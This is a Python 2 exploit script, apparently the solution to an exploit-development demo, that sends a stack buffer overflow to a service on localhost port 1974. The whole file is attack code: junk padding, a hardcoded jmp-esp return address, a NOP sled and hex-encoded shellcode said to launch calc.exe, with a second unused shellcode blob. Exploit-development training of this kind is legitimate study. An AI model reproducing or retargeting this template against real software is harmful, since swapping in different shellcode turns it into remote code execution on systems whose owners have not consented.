#!/usr/bin/python 
# Solution for demo

import socket 
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
# crash occured at 108 byte
junk = '\x41'*69

shell_sp = '\x42'*40 +'\x43'*300
# jmp esp address 7C 91 FC D8
code="X"*8+"B"*392
#eip = '\xD8\xFC\x91\x7c' 
eip = '\x53\x93\x42\x7E'
nops = '\x90'*200
# shell space = 1880 bytes, runs calc.exe
shell=("\xd9\xc5\xd9\x74\x24\xf4\xbe\xc1\x9a\xec\x97\x5a\x29\xc9\xb1"
"\x33\x31\x72\x17\x03\x72\x17\x83\x2b\x66\x0e\x62\x57\x7f\x46"
"\x8d\xa7\x80\x39\x07\x42\xb1\x6b\x73\x07\xe0\xbb\xf7\x45\x09"
"\x37\x55\x7d\x9a\x35\x72\x72\x2b\xf3\xa4\xbd\xac\x35\x69\x11"
"\x6e\x57\x15\x6b\xa3\xb7\x24\xa4\xb6\xb6\x61\xd8\x39\xea\x3a"
"\x97\xe8\x1b\x4e\xe5\x30\x1d\x80\x62\x08\x65\xa5\xb4\xfd\xdf"
"\xa4\xe4\xae\x54\xee\x1c\xc4\x33\xcf\x1d\x09\x20\x33\x54\x26"
"\x93\xc7\x67\xee\xed\x28\x56\xce\xa2\x16\x57\xc3\xbb\x5f\x5f"
"\x3c\xce\xab\x9c\xc1\xc9\x6f\xdf\x1d\x5f\x72\x47\xd5\xc7\x56"
"\x76\x3a\x91\x1d\x74\xf7\xd5\x7a\x98\x06\x39\xf1\xa4\x83\xbc"
"\xd6\x2d\xd7\x9a\xf2\x76\x83\x83\xa3\xd2\x62\xbb\xb4\xba\xdb"
"\x19\xbe\x28\x0f\x1b\x9d\x26\xce\xa9\x9b\x0f\xd0\xb1\xa3\x3f"
"\xb9\x80\x28\xd0\xbe\x1c\xfb\x95\x31\x57\xa6\xbf\xd9\x3e\x32"
"\x82\x87\xc0\xe8\xc0\xb1\x42\x19\xb8\x45\x5a\x68\xbd\x02\xdc"
"\x80\xcf\x1b\x89\xa6\x7c\x1b\x98\xc4\xe3\x8f\x40\x25\x86\x37"
"\xe2\x39")

shell1= "xAA\xd9\xec\xd9\x74\x24\xf4\xb8\x28\x1f\x44\xde\x5b\x31\xc9\xb1\x33\x31\x43\x17\x83\xeb\xfc\x03\x6b\x0c\xa6\x2b\x97\xda\xaf\xd4\x67\x1b\xd0\x5d\x82\x2a\xc2\x3a\xc7\x1f\xd2\x49\x85\x93\x99\x1c\x3d\x27\xef\x88\x32\x80\x5a\xef\x7d\x11\x6b\x2f\xd1\xd1\xed\xd3\x2b\x06\xce\xea\xe4\x5b\x0f\x2a\x18\x93\x5d\xe3\x57\x06\x72\x80\x25\x9b\x73\x46\x22\xa3\x0b\xe3\xf4\x50\xa6\xea\x24\xc8\xbd\xa5\xdc\x62\x99\x15\xdd\xa7\xf9\x6a\x94\xcc\xca\x19\x27\x05\x03\xe1\x16\x69\xc8\xdc\x97\x64\x10\x18\x1f\x97\x67\x52\x5c\x2a\x70\xa1\x1f\xf0\xf5\x34\x87\x73\xad\x9c\x36\x57\x28\x56\x34\x1c\x3e\x30\x58\xa3\x93\x4a\x64\x28\x12\x9d\xed\x6a\x31\x39\xb6\x29\x58\x18\x12\x9f\x65\x7a\xfa\x40\xc0\xf0\xe8\x95\x72\x5b\x66\x6b\xf6\xe1\xcf\x6b\x08\xea\x7f\x04\x39\x61\x10\x53\xc6\xa0\x55\xab\x8c\xe9\xff\x24\x49\x78\x42\x29\x6a\x56\x80\x54\xe9\x53\x78\xa3\xf1\x11\x7d\xef\xb5\xca\x0f\x60\x50\xed\xbc\x81\x71\x8e\x23\x12\x19\x7f\xc6\x92\xb8\x7f"
print "\nSending evil buffer..." 
s.connect(('127.0.0.1',1974)) 
data = s.recv(1024) 
s.send(junk+eip+nops+shell+'\r\n') 
print "\nDONE" 

s.close()